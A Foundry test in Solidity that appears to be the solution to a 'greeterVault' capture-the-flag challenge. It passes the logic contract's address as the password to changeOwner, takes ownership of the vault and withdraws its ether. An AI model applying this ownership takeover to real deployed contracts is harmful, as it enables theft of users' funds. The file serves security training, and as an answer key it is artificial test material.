// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {SetUp, VaultLogic} from "contracts/challenges/greeterVault/contracts/greeterVault.sol";

contract GreeterVaultTest is Test {
    SetUp public challenge;
    address public logic;
    address public vault;

    address public user;
    address public someone;

    function setUp() public {
        user = makeAddr("user");
        someone = makeAddr("someone");

        challenge = new SetUp{value: 1 ether}(bytes32(uint256(1)));
        vault = challenge.vault();
        logic = challenge.logic();
        bytes32 data = vm.load(address(vault), bytes32(uint256(1)));
        console2.logBytes32(data);
    }

    function testSolveGreeterVault() public {
        vm.startPrank(user);
        VaultLogic(vault).changeOwner(
            bytes32(uint256(uint160(logic))),
            payable(user)
        );
        VaultLogic(vault).withdraw();
        vm.stopPrank();
        assertTrue(challenge.isSolved());
    }
}
